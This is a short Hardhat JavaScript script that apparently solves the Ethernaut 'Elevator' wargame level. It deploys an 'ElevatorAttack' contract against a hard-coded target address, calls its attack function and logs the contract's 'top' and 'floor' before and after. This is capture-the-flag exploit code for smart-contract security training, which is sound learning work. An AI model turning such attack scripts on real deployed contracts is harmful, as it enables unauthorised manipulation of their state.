
const { ethers, waffle } = require("hardhat");

const CONTRACT_ADDRESS = "0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const provider = waffle.provider
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Elevator", CONTRACT_ADDRESS, signer)

    const top = await contract.top()
    console.log(`top is ${top}`)
    const floor = await contract.floor()
    console.log(`floor is ${floor}`)

    // deploy attack contract
    const BuildingFacory = await ethers.getContractFactory("ElevatorAttack")
    const building = await BuildingFacory.deploy(CONTRACT_ADDRESS)
    await building.deployed()
    console.log(`attack Address : ${building.address}`)

    await building.attack()
    const top1 = await contract.top()
    console.log(`top is ${top1}`)
    const floor1 = await contract.floor()
    console.log(`floor is ${floor1}`)

}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});